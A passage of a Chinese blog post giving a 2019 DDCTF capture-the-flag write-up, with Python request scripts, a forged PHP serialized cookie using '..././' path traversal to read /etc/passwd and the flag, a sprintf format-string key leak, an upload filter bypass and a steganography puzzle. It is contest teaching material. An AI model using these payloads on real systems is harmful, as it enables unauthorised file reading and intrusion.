+<p>运行后发现被base64加密过的数据,解密后得到index.php源代码<br><img src="https://user-images.githubusercontent.com/38073810/56411544-af3a1c80-62b3-11e9-9ffb-753e66bc2444.png" alt="image"><br><img src="https://user-images.githubusercontent.com/38073810/56411746-5ae36c80-62b4-11e9-9f72-bf47be8a1ef9.png" alt="image"><br>审计发现config会被转换成！,然后构造尝试多次无果。所以暂时放弃了。<br>后来继续又看了遍代码，在注释里面发现一个博客，浏览后发现此篇文章并没有什么用，但是在推荐里面发现一篇有用的文章<br><img src="https://user-images.githubusercontent.com/38073810/56411959-29b76c00-62b5-11e9-9729-ca87df0be002.png" alt="image"><br><img src="https://user-images.githubusercontent.com/38073810/56413773-27581080-62bb-11e9-926f-9dcdcb28d994.png" alt="image"></p>
+<h4 id="4、构造practice-txt-swp"><a href="#4、构造practice-txt-swp" class="headerlink" title="4、构造practice.txt.swp"></a>4、构造practice.txt.swp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"> u = <span class="string">'practice.txt.swp'</span></span><br><span class="line"></span><br><span class="line"> jpg = base64.b64encode(base64.b64encode(<span class="string">""</span>.join(<span class="string">"&#123;:02x&#125;"</span>.format(ord(c)) <span class="keyword">for</span> c <span class="keyword">in</span> u).encode(<span class="string">'utf-8'</span>))).decode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line"> r = requests.get(<span class="string">'http://117.51.150.246/index.php'</span>, params=&#123;<span class="string">'jpg'</span>: jpg&#125;)</span><br><span class="line"></span><br><span class="line"> print(r.url)</span><br><span class="line"> print(r.text)</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+<p><img src="https://user-images.githubusercontent.com/38073810/56412137-caa62700-62b5-11e9-8cce-c33bdec84bb6.png" alt="image"><br> 运行后得到Base64加密过的数据，解密后得到<br><img src="https://user-images.githubusercontent.com/38073810/56412320-4acc8c80-62b6-11e9-89a9-5fa3f4be196e.png" alt="image"></p>
+<h4 id="5、构造f1ag-ddctf-php"><a href="#5、构造f1ag-ddctf-php" class="headerlink" title="5、构造f1ag!ddctf.php"></a>5、构造f1ag!ddctf.php</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">u = <span class="string">'f1agconfigddctf.php'</span></span><br><span class="line"></span><br><span class="line">jpg = base64.b64encode(base64.b64encode(<span class="string">""</span>.join(<span class="string">"&#123;:02x&#125;"</span>.format(ord(c)) <span class="keyword">for</span> c <span class="keyword">in</span> u).encode(<span class="string">'utf-8'</span>))).decode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">'http://117.51.150.246/index.php'</span>, params=&#123;<span class="string">'jpg'</span>: jpg&#125;)</span><br><span class="line"></span><br><span class="line">print(r.url)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+<p>之前我们在index.php中可以通过审计代码得到config可以被替换为！所以我们在构造f1ag!ddctf.php时，注意把！替换为config<br>得到Base64加密过的数据，解密后得到<br><img src="https://user-images.githubusercontent.com/38073810/56412587-55d3ec80-62b7-11e9-9d02-3c714d4df416.png" alt="image"><br>审计代码后发现可以利用extract变量覆盖<br>资料：<a href="http://www.w3school.com.cn/php/func_array_extract.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/php/func_array_extract.asp</a><br>我们构造payload:<a href="http://117.51.150.246/f1ag!ddctf.php?uid=&amp;k=1" target="_blank" rel="noopener">http://117.51.150.246/f1ag!ddctf.php?uid=&amp;k=1</a>  最终得到flag<br><img src="https://user-images.githubusercontent.com/38073810/56413294-99c7f100-62b9-11e9-82f9-77c9d8e706ba.png" alt="image"></p>
+<h3 id="二、WEB签到题"><a href="#二、WEB签到题" class="headerlink" title="二、WEB签到题"></a>二、WEB签到题</h3><p><img src="https://user-images.githubusercontent.com/38073810/56414702-0b09a300-62be-11e9-8592-215823d406fe.png" alt="image"><br>靶机:<a href="http://117.51.158.44/index.php" target="_blank" rel="noopener">http://117.51.158.44/index.php</a><br>知识点：php代码审计、文本格式化、php反序列化</p>
+<h4 id="1、查看js-didictf-username"><a href="#1、查看js-didictf-username" class="headerlink" title="1、查看js, didictf_username"></a>1、查看js, didictf_username</h4><p><img src="https://user-images.githubusercontent.com/38073810/56415105-45277480-62bf-11e9-8503-938ce3ca7efb.png" alt="image"></p>
+<h4 id="2、Burpsuite抓包，修改didictf-username为admin，得到目录"><a href="#2、Burpsuite抓包，修改didictf-username为admin，得到目录" class="headerlink" title="2、Burpsuite抓包，修改didictf_username为admin，得到目录"></a>2、Burpsuite抓包，修改didictf_username为admin，得到目录</h4><p><img src="https://user-images.githubusercontent.com/38073810/56414665-e1e91280-62bd-11e9-923f-85c423939e56.png" alt="6DD11375-1C41-494F-82F1-A4514A657B38"></p>
+<h4 id="3、访问app-fL2XID2i0Cdh-php-得到源码"><a href="#3、访问app-fL2XID2i0Cdh-php-得到源码" class="headerlink" title="3、访问app/fL2XID2i0Cdh.php,得到源码"></a>3、访问app/fL2XID2i0Cdh.php,得到源码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">url:app/Application.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $path = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">response</span><span class="params">($data, $errMsg = <span class="string">'success'</span>)</span> </span>&#123;</span><br><span class="line">        $ret = [<span class="string">'errMsg'</span> =&gt; $errMsg,</span><br><span class="line">            <span class="string">'data'</span> =&gt; $data];</span><br><span class="line">        $ret = json_encode($ret);</span><br><span class="line">        header(<span class="string">'Content-type: application/json'</span>);</span><br><span class="line">        <span class="keyword">echo</span> $ret;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $DIDICTF_ADMIN = <span class="string">'admin'</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>]) &amp;&amp; $_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>] == $DIDICTF_ADMIN) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'抱歉，您没有登陆权限，请获取权限后访问-----'</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizepath</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">    $path = trim($path);</span><br><span class="line">    $path=str_replace(<span class="string">'../'</span>,<span class="string">''</span>,$path);</span><br><span class="line">    $path=str_replace(<span class="string">'..\\'</span>,<span class="string">''</span>,$path);</span><br><span class="line">    <span class="keyword">return</span> $path;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;path)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $path = <span class="keyword">$this</span>-&gt;sanitizepath(<span class="keyword">$this</span>-&gt;path);</span><br><span class="line">        <span class="keyword">if</span>(strlen($path) !== <span class="number">18</span>) &#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;response($data=file_get_contents($path),<span class="string">'Congratulations'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url:app/Session.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'Application.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//key建议为8位字符串</span></span><br><span class="line">    <span class="keyword">var</span> $eancrykey                  = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_expiration			= <span class="number">7200</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_name                = <span class="string">'ddctf_id'</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_path				= <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_domain				= <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_secure				= <span class="keyword">FALSE</span>;</span><br><span class="line">    <span class="keyword">var</span> $activity                   = <span class="string">"DiDiCTF"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">parent</span>::auth()) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;get_key();</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;session_read()) &#123;</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you %s'</span>;</span><br><span class="line">                $data = sprintf($data,$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;session_create();</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you'</span>;</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//eancrykey  and flag under the folder</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;eancrykey =  file_get_contents(<span class="string">'../config/key.txt'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">session_read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $session = $_COOKIE[<span class="keyword">$this</span>-&gt;cookie_name];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($session)) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"session not found"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $hash = substr($session,strlen($session)<span class="number">-32</span>);</span><br><span class="line">        $session = substr($session,<span class="number">0</span>,strlen($session)<span class="number">-32</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($hash !== md5(<span class="keyword">$this</span>-&gt;eancrykey.$session)) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"the cookie data not match"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $session = unserialize($session);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!is_array($session) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'session_id'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'ip_address'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'user_agent'</span>]))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;</span><br><span class="line">            $arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">            $data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">                $data = sprintf($data,$v);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'ip_address'</span>] != $_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the ip addree not match'</span>.<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'user_agent'</span>] != $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the user agent not match'</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">session_create</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $sessionid = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">while</span>(strlen($sessionid) &lt; <span class="number">32</span>) &#123;</span><br><span class="line">            $sessionid .= mt_rand(<span class="number">0</span>,mt_getrandmax());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $userdata = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'session_id'</span> =&gt; md5(uniqid($sessionid,<span class="keyword">TRUE</span>)),</span><br><span class="line">            <span class="string">'ip_address'</span> =&gt; $_SERVER[<span class="string">'REMOTE_ADDR'</span>],</span><br><span class="line">            <span class="string">'user_agent'</span> =&gt; $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>],</span><br><span class="line">            <span class="string">'user_data'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $cookiedata = serialize($userdata);</span><br><span class="line">        $cookiedata = $cookiedata.md5(<span class="keyword">$this</span>-&gt;eancrykey.$cookiedata);</span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;cookie_expiration + time();</span><br><span class="line">        setcookie(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_name,</span><br><span class="line">            $cookiedata,</span><br><span class="line">            $expire,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_path,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_domain,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_secure</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ddctf = <span class="keyword">new</span> Session();</span><br><span class="line">$ddctf-&gt;index();</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>分析源码，在109行看到危险函数unserialize，44行file_get_contents<br>到这里大致可以猜到解题流程<br>session反序列化–&gt;创建Application对象–&gt;控制/path–&gt;获取flag</p>
+<h4 id="4、分析代码"><a href="#4、分析代码" class="headerlink" title="4、分析代码"></a>4、分析代码</h4><p><img src="https://user-images.githubusercontent.com/38073810/56416875-c6cdd100-62c4-11e9-82a2-a2006dee1132.png" alt="image"><br>从上可以知道签名规则md5(eancrykey+session)，所以我们只有得到eancrykey+session才能控制cookie。<br>分析eancrykey出现地点，得到如下两处<br><img src="https://user-images.githubusercontent.com/38073810/56417106-71de8a80-62c5-11e9-947d-4d43892a1c12.png" alt="image"><br><img src="https://user-images.githubusercontent.com/38073810/56417155-9aff1b00-62c5-11e9-8fbb-fad006d6dafa.png" alt="image"><br>由于不存在文件读取漏洞所以第一处暂时不可用，但是第二处可获取eancrykey<br>审计第二处发现sprintf函数，查阅用法：<a href="http://www.w3school.com.cn/php/func_string_sprintf.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/php/func_string_sprintf.asp</a><br>构造payload：<br><img src="https://user-images.githubusercontent.com/38073810/56417422-75bedc80-62c6-11e9-8bc2-22e04f408610.png" alt="image"><br><img src="https://user-images.githubusercontent.com/38073810/56417436-85d6bc00-62c6-11e9-9785-a6d32c5f4f95.png" alt="image"><br>成功得到key</p>
+<h4 id="5、构造session"><a href="#5、构造session" class="headerlink" title="5、构造session"></a>5、构造session</h4><p>分析Application<br><img src="https://user-images.githubusercontent.com/38073810/56417710-57a5ac00-62c7-11e9-9a85-4fc004ba1669.png" alt="image"><br>发现代码有双层防护，保证path安全。<br>sanitizepath可以使用双写绕过<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Payload:../</span><br><span class="line">双写后：..././</span><br></pre></td></tr></table></figure></p>
+<p>再看限制字符为18。<br>此时尝试读取/etc/passwd。计算其长度，为10。此时我们可以构造如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Payload:/etc/../etc/passwd</span><br><span class="line">双写后:/etc/..././etc/passwd</span><br><span class="line">序列化后:O:11:<span class="string">"Application"</span>:1:&#123;s:4:<span class="string">"path"</span>;s:21:<span class="string">"/etc/..././etc/passwd"</span>;&#125;</span><br><span class="line">按规则签名后:O%3a11%3a<span class="string">"Application"</span>%3a1%3a&#123;s%3a4%3a<span class="string">"path"</span>%3bs%3a21%3a<span class="string">"/etc/..././etc/passwd"</span>%3b&#125;75c51ff78b04d77138ca58f797dedc0a;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://user-images.githubusercontent.com/38073810/56418102-8c663300-62c8-11e9-93bb-dcd09e00c8a1.png" alt="image"><br>此时我们读取了/etc/passwd<br>最终在 ../config/flag.txt读到flag<br><img src="https://user-images.githubusercontent.com/38073810/56418180-c6373980-62c8-11e9-95c4-7b2bea1d74c5.png" alt="image"></p>
+<h3 id="三、Upload-IMG"><a href="#三、Upload-IMG" class="headerlink" title="三、Upload-IMG"></a>三、Upload-IMG</h3><p><img src="https://user-images.githubusercontent.com/38073810/56418271-01396d00-62c9-11e9-9a1c-9aaadd5beb6a.png" alt="image"><br>靶机：<a href="http://117.51.148.166/upload.php" target="_blank" rel="noopener">http://117.51.148.166/upload.php</a><br>知识点：GD库渲染绕过</p>
+<h4 id="1、上传文件"><a href="#1、上传文件" class="headerlink" title="1、上传文件"></a>1、上传文件</h4><p>首先随便上传一张jpg图片<br>然后把上传成功的图片下载到本地</p>
+<h4 id="2、文件对比"><a href="#2、文件对比" class="headerlink" title="2、文件对比"></a>2、文件对比</h4><p>利用在线图片对比：<a href="http://www.newjson.com/Static/Tools/Diff.html" target="_blank" rel="noopener">http://www.newjson.com/Static/Tools/Diff.html</a><br><img src="https://user-images.githubusercontent.com/38073810/56418545-c257e700-62c9-11e9-8a5d-ac903fddf422.png" alt="image"><br>然后发现文件被调用GD库渲染过了，所以我们来绕过GD库</p>
+<h4 id="3、生成payload并上传"><a href="#3、生成payload并上传" class="headerlink" title="3、生成payload并上传"></a>3、生成payload并上传</h4><p>我们直接使用大牛的Payload脚本：<a href="https://github.com/Medicean/VulApps/blob/master/c/cmseasy/1/jpg_payload.php" target="_blank" rel="noopener">https://github.com/Medicean/VulApps/blob/master/c/cmseasy/1/jpg_payload.php</a><br><img src="https://user-images.githubusercontent.com/38073810/56418862-da7c3600-62ca-11e9-9805-e53358e94223.png" alt="image"></p>
+<h4 id="4、Get-Flag"><a href="#4、Get-Flag" class="headerlink" title="4、Get Flag"></a>4、Get Flag</h4><p><img src="https://user-images.githubusercontent.com/38073810/56419064-8faeee00-62cb-11e9-9ed8-c9412fa5448c.png" alt="image"></p>
+<h2 id="Misc解题思路"><a href="#Misc解题思路" class="headerlink" title="Misc解题思路"></a>Misc解题思路</h2><h3 id="一、Wireshark"><a href="#一、Wireshark" class="headerlink" title="一、Wireshark"></a>一、Wireshark</h3><p><img src="https://user-images.githubusercontent.com/38073810/56419440-d5b88180-62cc-11e9-8841-93adcc1fe2dc.png" alt="image"></p>
+<h4 id="1、下载文件"><a href="#1、下载文件" class="headerlink" title="1、下载文件"></a>1、下载文件</h4><p>用Wireshark打开，然后我们直接先导出http对象到本地<br><img src="https://user-images.githubusercontent.com/38073810/56420096-39dc4500-62cf-11e9-82bd-7bc1018d440d.png" alt="64BC6486-5381-44C5-8EA0-1ADE9B17A850"><br><img src="https://user-images.githubusercontent.com/38073810/56420099-3e086280-62cf-11e9-8358-df1c645d7d83.png" alt="7704BCEE-E57B-4A73-82E2-E2248211DAA4"><br><img src="https://user-images.githubusercontent.com/38073810/56420285-ea4a4900-62cf-11e9-9e9a-6c21ae0f1f25.png" alt="image"></p>
+<h4 id="2、文件分析"><a href="#2、文件分析" class="headerlink" title="2、文件分析"></a>2、文件分析</h4><p>我们首先用notepade打开%5c(1)，发现他是一张png图片，然后把png头文件格式之前全部删除，保存之后修改后缀为.png<br><img src="https://user-images.githubusercontent.com/38073810/56420420-79576100-62d0-11e9-94b5-7f55ecb987df.png" alt="E2210F4A-55C6-4B25-9060-33DD84E1AF4B"><br><img src="https://user-images.githubusercontent.com/38073810/56420426-7bb9bb00-62d0-11e9-8033-1fab298125ec.png" alt="EA28F0CF-DB21-4068-9900-AF81BE4967F6"><br>打开后根据经验判断，图片高度应该被修改过了，我们把图片高度稍微调高一点，得到key<br><img src="https://user-images.githubusercontent.com/38073810/56420495-bf142980-62d0-11e9-8634-ff79ec22cfc2.png" alt="5124FCA7-ED8A-4A3C-8D3A-6A0C868560D5"><br><img src="https://user-images.githubusercontent.com/38073810/56420509-caffeb80-62d0-11e9-938b-9986e8aa3f30.png" alt="1C7AC9CC-7F60-4ADD-AE93-59B14C44052D"><br>然后我们继续用notepade打开%5c(4)，发现也是一张png图片，然后把png头文件格式之前全部删除，保存之后修改后缀为.png<br><img src="https://user-images.githubusercontent.com/38073810/56420579-229e5700-62d1-11e9-8015-5e603f2493cc.png" alt="0E25F7EF-52A3-40DF-9EB1-9C3A3447D0E0"><br><img src="https://user-images.githubusercontent.com/38073810/56420583-2631de00-62d1-11e9-94ef-94ffbcae77cb.png" alt="BFB7E879-0842-4FB2-866E-9D28EFDB354C"><br>到这里基本就能猜到是图片加密隐藏信息<br>当然如果猜不出我们也可以从这里看出加密的网址<br><img src="https://user-images.githubusercontent.com/38073810/56420643-6a24e300-62d1-11e9-8cb2-8d7065434f3a.png" alt="BE6D35D6-BAA4-4073-B8A0-3DC6DF29FB3A"></p>
+<h4 id="3、图片解密"><a href="#3、图片解密" class="headerlink" title="3、图片解密"></a>3、图片解密</h4><p>在线图片添加/解密隐藏信息(隐写术)工具：<a href="http://tools.jb51.net/aideddesign/img_add_info" target="_blank" rel="noopener">http://tools.jb51.net/aideddesign/img_add_info</a><br><img src="https://user-images.githubusercontent.com/38073810/56420660-7872ff00-62d1-11e9-8970-c896fbcbc723.png" alt="479F8B5A-8E56-43D7-AB7C-D5EF368433B4"><br><img src="https://user-images.githubusercontent.com/38073810/56420667-7ad55900-62d1-11e9-8c92-84712473ed11.png" alt="F0AECFEE-C793-4B54-B716-1E0E22E714EA"></p>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="https:///login546.github.io/2019/04/19/2019-DDCTF-writeup/" title="2019-DDCTF-writeup" target="_blank" rel="external">https:///login546.github.io/2019/04/19/2019-DDCTF-writeup/</a>
+    </li>
+    
+    <li class="post-copyright-license">
